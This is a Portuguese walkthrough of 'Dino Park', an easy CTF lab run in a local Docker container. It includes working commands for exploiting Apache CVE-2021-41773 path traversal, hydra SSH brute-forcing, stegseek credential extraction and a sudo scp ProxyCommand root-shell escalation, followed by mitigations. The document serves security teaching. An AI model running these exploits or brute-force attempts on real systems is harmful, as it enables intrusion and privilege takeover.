# Guia de Resolução – CTF Dino Park

## 1. Contextualização

**Dino Park** é um desafio de CTF de nível **fácil**, ambientado em um parque temático de dinossauros cujo site institucional e servidor de acesso remoto foram publicados sem os devidos cuidados de segurança. O jogador assume o papel de um atacante externo que, a partir de um simples reconhecimento web, encontra uma cadeia de falhas que vai de um serviço desatualizado até o controle total do servidor.

O ambiente expõe dois serviços:

| Porta (host) | Porta (container) | Serviço |
| --- | --- | --- |
| 8080 | 80 | Apache HTTP Server 2.4.49 |
| 2222 | 22 | OpenSSH |

O desafio possui **duas flags**, no formato `TAC{...}`: uma flag de usuário, obtida após o acesso inicial, e uma flag de root, obtida após a escalação de privilégios.

## 2. Instruções de execução do ambiente

**1. Baixar a imagem** (não é necessário ter conta no Docker Hub):

```bash
docker pull gibi177/dinopark-ctf:1.2
```

**2. Subir o desafio:**

```bash
docker run -d --name dinopark-ctf \
  -p 8080:80 \
  -p 2222:22 \
  gibi177/dinopark-ctf:1.2
```

**3. Atacar**, usando `localhost` (ou `127.0.0.1`) como IP-alvo, portas `8080` (HTTP) e `2222` (SSH).

**4. Parar e remover o container** ao final:

```bash
docker rm -f dinopark-ctf
```

Para jogar novamente, basta repetir o comando do passo 2.

**Observações:**
- Se as portas `8080` ou `2222` já estiverem em uso, altere apenas a porta do host (o primeiro número do parâmetro `-p`, à esquerda dos dois-pontos) — as portas internas do container (`80` e `22`) não devem ser alteradas, pois os serviços do desafio dependem delas.
- Ataque apenas o container do desafio; não ataque o host, a rede ou outros grupos.
- Para consultar os logs do container: `docker logs dinopark-ctf`.

## 3. Descrição das vulnerabilidades implementadas

| # | Vulnerabilidade | Onde | Impacto |
| --- | --- | --- | --- |
| 1 | **Path Traversal / RCE — CVE-2021-41773** | Apache HTTP Server 2.4.49 | Leitura arbitrária de arquivos (e potencialmente execução remota de código), usada aqui para ler `/etc/passwd` |
| 2 | **Credencial fraca sujeita a brute force** | Usuário `estagiario_ti` no SSH, com senha presente na wordlist `rockyou.txt` | Acesso inicial não privilegiado via SSH |
| 3 | **Exposição de credenciais via esteganografia** | Senha do usuário `fotografo` embutida (via `steghide`, sem senha de extração) na imagem `ultimo_clique.jpg`, disponível no diretório `backups_camera` do usuário `estagiario_ti` | Movimento lateral de `estagiario_ti` para `fotografo` |
| 4 | **Escalonamento de privilégios via sudoers mal configurado** | Entrada `fotografo ALL=(ALL) NOPASSWD: /usr/bin/scp` em `/etc/sudoers` | Execução de `scp` como root sem senha, explorável via GTFOBins para obter shell root |

A cadeia foi desenhada propositalmente para exigir, conforme pedido pelo professor, acesso inicial como usuário sem privilégios seguido de uma técnica de escalonamento de privilégios vista em sala (abuso de `sudo` configurado de forma insegura, documentado no GTFOBins).

## 4. Walkthrough técnico

### 4.1 Reconhecimento

Varredura inicial de portas e serviços com `nmap`:

```bash
nmap -T4 -A -sV localhost -p 8080,2222
```

O resultado confirma um Apache httpd 2.4.49 na porta 8080 e um OpenSSH na porta 2222.

Acessando o site em `http://localhost:8080`, a página inicial do parque é exibida normalmente. Inspecionando o código-fonte HTML, um comentário deixado no código revela o nome de um funcionário, o usuário **`estagiario_ti`** — um indício claro para a etapa de força bruta mais adiante. Uma varredura de diretórios com `gobuster` não revela caminhos adicionais relevantes, indicando que o vetor de entrada não está em conteúdo escondido, e sim na própria versão do servidor web.

### 4.2 Exploração inicial

**Identificar o exploit da versão do Apache:**

```bash
searchsploit apache 2.4
# Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE) | multiple/webapps/50383.sh
searchsploit -m multiple/webapps/50383.sh
```

**Explorar o CVE-2021-41773 para ler `/etc/passwd`** e enumerar usuários do sistema:

```bash
echo "localhost:8080" > alvos.txt
bash 50383.sh alvos.txt /etc/passwd
```

A saída confirma os usuários `estagiario_ti` e `fotografo`, além do `root`.

**Força bruta no SSH** contra o usuário já identificado no HTML, com a wordlist `rockyou.txt`:

```bash
hydra -l estagiario_ti -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222
```

O Hydra encontra a senha de `estagiario_ti`.

**Acesso inicial via SSH:**

```bash
ssh estagiario_ti@localhost -p 2222
```

Já dentro da máquina, uma listagem do diretório pessoal revela a pasta `backups_camera`, contendo o arquivo `ultimo_clique.jpg`:

```bash
ls
cd backups_camera
ls
```

**Cópia da imagem para a máquina atacante:**

```bash
scp -P 2222 estagiario_ti@localhost:/home/estagiario_ti/backups_camera/ultimo_clique.jpg .
```

**Extração de dados escondidos com esteganografia**, usando `stegseek` com a wordlist `rockyou.txt` para quebrar a senha de extração:

```bash
stegseek ultimo_clique.jpg /usr/share/wordlists/rockyou.txt
cat ultimo_clique.jpg.out
```

O arquivo extraído (`credenciais.txt`) revela usuário e senha do `fotografo`.

**Login como `fotografo` e captura da flag de usuário:**

```bash
ssh fotografo@localhost -p 2222
whoami
ls -la
cat user.txt
```

→ **Flag de usuário obtida.**

### 4.3 Escalonamento de privilégios

**Verificar permissões de `sudo` do usuário `fotografo`:**

```bash
sudo -l
```

A saída mostra:

```
User fotografo may run the following commands on dinopark-ctf:
    (ALL) NOPASSWD: /usr/bin/scp
```

Ou seja, `fotografo` pode executar `scp` como root, sem senha. O GTFOBins lista o um comando `scp` para estabelecimento de shell, através do parâmetro `ProxyCommand`:

```bash
sudo scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```

Isso abre uma shell interativa como **root** (confirmado com `whoami`).

**Captura da flag de root:**

```bash
cd /root
ls
cat root.txt
```

→ **Flag de root obtida — desafio concluído.**

## 5. Conclusões

O desafio Dino Park ilustra uma cadeia de comprometimento típica de ambientes reais mal configurados: uma vulnerabilidade conhecida em software desatualizado (CVE-2021-41773) serve como ponto de partida para enumeração de usuários; uma política de senhas fraca permite acesso inicial via força bruta; dados sensíveis deixados sem proteção (esteganografia com senha vazia) permitem movimento lateral entre usuários; e, por fim, uma regra de `sudo` concedida sem necessidade real de privilégio permite escalonamento completo até root.

**Recomendações de mitigação:**

| Vulnerabilidade | Mitigação |
| --- | --- |
| Apache 2.4.49 (CVE-2021-41773) | Atualizar para uma versão corrigida (≥ 2.4.51) e restringir `Require all granted` apenas aos diretórios necessários |
| Senha fraca em SSH | Política de senhas fortes, autenticação por chave pública e bloqueio após tentativas falhas |
| Credenciais em imagem (esteganografia) | Nunca armazenar credenciais em arquivos de backup ou mídia; usar um gerenciador de segredos |
| `sudo` sem senha em `scp` | Aplicar o princípio do menor privilégio; nunca liberar `NOPASSWD` para binários listados no GTFOBins como exploráveis |

A cadeia completa (enumeração web → RCE/Path Traversal → enumeração de usuários → força bruta → esteganografia → escalonamento via `sudo`/GTFOBins) atende ao requisito de exigir tanto acesso inicial sem privilégios quanto uma técnica de escalonamento vista em sala.

## 6. Referências

- [CVE-2021-41773 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [Apache HTTP Server 2.4.49 - Path Traversal & RCE (Exploit-DB 50383)](https://www.exploit-db.com/exploits/50383)
- [GTFOBins - scp](https://gtfobins.github.io/gtfobins/scp/)
- [steghide - documentação oficial](http://steghide.sourceforge.net/documentation.php)
- [stegseek - repositório oficial](https://github.com/RickdeJager/stegseek)
